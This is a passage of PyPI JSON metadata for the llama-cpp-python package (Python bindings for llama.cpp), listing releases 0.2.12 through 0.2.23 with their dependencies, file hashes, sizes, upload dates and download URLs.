\"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.12","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"11350185e28cfcdb59ab17e09a6cc6e19c7271db236ee1c9d41143a082b463b7","md5":"f317e50e215901e600c859775997b402","sha256":"b97330f2ccb8c4f6a41b93c1de38c9a3e6baee77ada5edf5a70210edf04db4b8"},"downloads":-1,"filename":"llama_cpp_python-0.2.12.tar.gz","has_sig":false,"md5_digest":"f317e50e215901e600c859775997b402","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":7573848,"upload_time":"2023-11-01T23:31:52","upload_time_iso_8601":"2023-11-01T23:31:52.477358Z","url":"https://files.pythonhosted.org/packages/11/35/0185e28cfcdb59ab17e09a6cc6e19c7271db236ee1c9d41143a082b463b7/llama_cpp_python-0.2.12.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.13":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.13/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.13","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"da5855a26595009d76237273b340d718e04d9a33c5afd440e45552f45a16b1d9","md5":"b5df62442fac574a4045de0de5231b9f","sha256":"def811fcc3a1b17bca5241ae242276cc2e679115cbbf1954d63ab079a788c37a"},"downloads":-1,"filename":"llama_cpp_python-0.2.13.tar.gz","has_sig":false,"md5_digest":"b5df62442fac574a4045de0de5231b9f","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":7180124,"upload_time":"2023-11-02T19:55:24","upload_time_iso_8601":"2023-11-02T19:55:24.906592Z","url":"https://files.pythonhosted.org/packages/da/58/55a26595009d76237273b340d718e04d9a33c5afd440e45552f45a16b1d9/llama_cpp_python-0.2.13.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.14":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.14/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.14","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"822ce742d611024256b5540380e7a62cd1fdc3cc1b47f5d2b86610f545804acd","md5":"b7c42f5af262aaade66bc54fffcfa058","sha256":"a0dc01098d73b18b1cdac9e598d9a7a1292466e2dee33e838a0a4ef242256bdf"},"downloads":-1,"filename":"llama_cpp_python-0.2.14.tar.gz","has_sig":false,"md5_digest":"b7c42f5af262aaade66bc54fffcfa058","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":7198567,"upload_time":"2023-11-06T14:40:32","upload_time_iso_8601":"2023-11-06T14:40:32.310931Z","url":"https://files.pythonhosted.org/packages/82/2c/e742d611024256b5540380e7a62cd1fdc3cc1b47f5d2b86610f545804acd/llama_cpp_python-0.2.14.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.15":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.15/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.15","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"0ce90d48a445430bed484791f76a4ab1d7950e57468127a3ee6a6ec494f46ae5","md5":"2e66e7cca1d6d97fa6ff34c1a1b21146","sha256":"ff03427216fe28cc85b37e7d7fb6a23ea85cdfe8904a993856fe0693ad58ffd1"},"downloads":-1,"filename":"llama_cpp_python-0.2.15.tar.gz","has_sig":false,"md5_digest":"2e66e7cca1d6d97fa6ff34c1a1b21146","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":7749764,"upload_time":"2023-11-08T05:57:29","upload_time_iso_8601":"2023-11-08T05:57:29.131679Z","url":"https://files.pythonhosted.org/packages/0c/e9/0d48a445430bed484791f76a4ab1d7950e57468127a3ee6a6ec494f46ae5/llama_cpp_python-0.2.15.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.16":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.16/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.16","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"a83eb0bd26d0d0d0dd9187a6e4e46c2744c1d7d52cc2834b35db61776af00219","md5":"701d483dd0bbe3e20610a56426a39408","sha256":"107138d45b5e479fc89f416cd4c4301eae9a1ff46f104cfba22a4d0a61742735"},"downloads":-1,"filename":"llama_cpp_python-0.2.16.tar.gz","has_sig":false,"md5_digest":"701d483dd0bbe3e20610a56426a39408","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":7756807,"upload_time":"2023-11-10T11:23:11","upload_time_iso_8601":"2023-11-10T11:23:11.024274Z","url":"https://files.pythonhosted.org/packages/a8/3e/b0bd26d0d0d0dd9187a6e4e46c2744c1d7d52cc2834b35db61776af00219/llama_cpp_python-0.2.16.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.17":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.17/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.17","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"d12ce75e2e5b08b805d23066f1c1f8dbb1777a5bd3b43f057d16d4b2634d9ae1","md5":"da26aebbabb083bab16450d1ac50f041","sha256":"3bbed5495c69ef518ee20f9803f6f270b76a0ddc3f61ce67e3c92e3fe6a1d053"},"downloads":-1,"filename":"llama_cpp_python-0.2.17.tar.gz","has_sig":false,"md5_digest":"da26aebbabb083bab16450d1ac50f041","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":7758188,"upload_time":"2023-11-10T21:38:49","upload_time_iso_8601":"2023-11-10T21:38:49.565855Z","url":"https://files.pythonhosted.org/packages/d1/2c/e75e2e5b08b805d23066f1c1f8dbb1777a5bd3b43f057d16d4b2634d9ae1/llama_cpp_python-0.2.17.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.18":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.18/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.18","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"1bbe3ce85cdf2f3b7c035ca52e0158b98d244d4ce40a51908b22e0b45c3ef75f","md5":"2adacdcf86999f9a92b4f40e30099cda","sha256":"faf270a861f114cc2dd1acdfff2a394023c30a9d8af58b8c1d492b31078b8cf9"},"downloads":-1,"filename":"llama_cpp_python-0.2.18.tar.gz","has_sig":false,"md5_digest":"2adacdcf86999f9a92b4f40e30099cda","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":7800714,"upload_time":"2023-11-14T19:15:55","upload_time_iso_8601":"2023-11-14T19:15:55.266444Z","url":"https://files.pythonhosted.org/packages/1b/be/3ce85cdf2f3b7c035ca52e0158b98d244d4ce40a51908b22e0b45c3ef75f/llama_cpp_python-0.2.18.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.19":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.19/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.19","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"9d1af74ce61893791530a9af61fe8925bd569d8fb087545dc1973d617c03ce11","md5":"9ff98259e32fa74e071cd546453e6c78","sha256":"5c3be3f98108b7fc747f5c7260344af13621cd626d628cd5a6c0f6eec53a873a"},"downloads":-1,"filename":"llama_cpp_python-0.2.19.tar.gz","has_sig":false,"md5_digest":"9ff98259e32fa74e071cd546453e6c78","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":7813005,"upload_time":"2023-11-21T10:08:58","upload_time_iso_8601":"2023-11-21T10:08:58.300566Z","url":"https://files.pythonhosted.org/packages/9d/1a/f74ce61893791530a9af61fe8925bd569d8fb087545dc1973d617c03ce11/llama_cpp_python-0.2.19.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.2":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.2/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.2","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"d028ef9e91c4ed9e96a2a0bcd6a8327f2d039745b59946eccc6ccb1a9ee2dedf","md5":"b8e31ca0929735c185f998825cadb778","sha256":"b8646919839730241109be9b2016577d5df85466d72f6db0690bc9529cf8e446"},"downloads":-1,"filename":"llama_cpp_python-0.2.2.tar.gz","has_sig":false,"md5_digest":"b8e31ca0929735c185f998825cadb778","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":1542825,"upload_time":"2023-09-13T05:52:10","upload_time_iso_8601":"2023-09-13T05:52:10.311095Z","url":"https://files.pythonhosted.org/packages/d0/28/ef9e91c4ed9e96a2a0bcd6a8327f2d039745b59946eccc6ccb1a9ee2dedf/llama_cpp_python-0.2.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.20":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.20/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.20","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"f06a3e161b68097fe2f9901e01dc7ec2afb4753699495004a37d2abdc3b1fd07","md5":"fdfce724a49a5ebbac8563d404e75aff","sha256":"a0ada1cb800ba4da60ea6ac4f7264b687a35412374e5af2c92e5b22852cdbafb"},"downloads":-1,"filename":"llama_cpp_python-0.2.20.tar.gz","has_sig":false,"md5_digest":"fdfce724a49a5ebbac8563d404e75aff","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":8672142,"upload_time":"2023-11-28T00:24:46","upload_time_iso_8601":"2023-11-28T00:24:46.607866Z","url":"https://files.pythonhosted.org/packages/f0/6a/3e161b68097fe2f9901e01dc7ec2afb4753699495004a37d2abdc3b1fd07/llama_cpp_python-0.2.20.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.22":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.22/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.22","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"157a49906adb90113f628c1f07dc746ca0978b8aa99a8f7325a8d961ce2a1919","md5":"ba751903719eb8eb82f9dac78fcff4a2","sha256":"29d3c5af374fa7b1c34abd4a76b9f477b50abb1d618872bb6cb1cb32841667bc"},"downloads":-1,"filename":"llama_cpp_python-0.2.22.tar.gz","has_sig":false,"md5_digest":"ba751903719eb8eb82f9dac78fcff4a2","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":8734902,"upload_time":"2023-12-11T15:30:59","upload_time_iso_8601":"2023-12-11T15:30:59.026988Z","url":"https://files.pythonhosted.org/packages/15/7a/49906adb90113f628c1f07dc746ca0978b8aa99a8f7325a8d961ce2a1919/llama_cpp_python-0.2.22.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.23":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.23/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == 